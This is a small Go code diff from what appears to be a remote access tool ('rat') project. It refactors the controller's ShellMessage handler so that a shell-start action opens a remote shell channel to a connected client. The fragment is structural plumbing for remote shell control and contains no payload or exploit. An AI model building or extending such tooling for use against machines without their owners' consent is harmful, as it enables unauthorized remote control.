@@ -1,19 +1,21 @@
 package main
 
-import (
-	"rat/shared/network/header"
-
-	"golang.org/x/net/websocket"
-)
+import "rat/shared"
 
 type ShellMessage struct {
-	Action  int    `json:"action"`
-	Command string `json:"command"`
+	Action shared.ShellAction `json:"action"`
+	Data   string             `json:"data"`
 }
 
-func (m ShellMessage) Handle(ws *websocket.Conn, client *Client) error {
-	client.Listeners[header.ShellHeader] = ws
-	client.Queue <- &ShellPacket{m.Action, m.Command}
+func (ShellMessage) Header() MessageHeader {
+	return ShellEvent
+}
+
+func (m ShellMessage) Handle(controller *Controller, client *Client) error {
+	switch m.Action {
+	case shared.ShellStart:
+		client.streamChan <- ShellChannel{controller}
+	}
 
 	return nil
 }
